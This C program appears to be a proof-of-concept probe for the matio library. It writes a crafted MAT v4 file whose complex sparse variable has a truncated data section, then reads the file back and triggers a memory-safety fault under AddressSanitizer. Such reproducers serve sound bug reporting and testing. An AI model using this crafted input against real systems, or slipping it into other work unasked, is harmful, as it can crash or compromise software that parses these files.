/* Self-contained probe: writes a crafted MAT v4 file holding one complex
 * sparse (double) variable whose trailing data section ends early, then
 * reads it back through the public matio API.
 *
 * Build against libmatio and run; the process aborts under AddressSanitizer
 * on the affected library while handling the crafted variable.
 */
#include <matio.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static void put_i32(FILE *fp, int v)
{
    fwrite(&v, sizeof(v), 1, fp);
}

static void put_dbl(FILE *fp, double v)
{
    fwrite(&v, sizeof(v), 1, fp);
}

int main(void)
{
    char path[] = "/tmp/matvar_probeXXXXXX";
    int fd = mkstemp(path);
    if ( fd < 0 )
        return 2;
    FILE *fp = fdopen(fd, "wb");
    if ( NULL == fp )
        return 2;

    /* v4 header: MOPT = 2 (little endian, double, sparse), storage matrix
     * is 5x4 (ncols == 4 marks a complex sparse variable) */
    put_i32(fp, 2);
    put_i32(fp, 5);
    put_i32(fp, 4);
    put_i32(fp, 0);
    put_i32(fp, 2);
    fwrite("a", 1, 2, fp);

    /* sparse storage: 4 row indices (1-based), row dimension,
     * 4 column indices (1-based), column dimension */
    put_dbl(fp, 1.0);
    put_dbl(fp, 2.0);
    put_dbl(fp, 3.0);
    put_dbl(fp, 4.0);
    put_dbl(fp, 4.0);
    put_dbl(fp, 1.0);
    put_dbl(fp, 1.0);
    put_dbl(fp, 2.0);
    put_dbl(fp, 2.0);
    put_dbl(fp, 2.0);

    /* data section: only 2 of the 4 expected real-part values before EOF */
    put_dbl(fp, 1.0);
    put_dbl(fp, 2.0);
    fclose(fp);

    mat_t *mat = Mat_Open(path, MAT_ACC_RDONLY);
    if ( NULL == mat ) {
        remove(path);
        return 1;
    }
    matvar_t *matvar;
    while ( NULL != (matvar = Mat_VarReadNext(mat)) ) {
        Mat_VarFree(matvar);
    }
    Mat_Close(mat);
    remove(path);
    return 0;
}
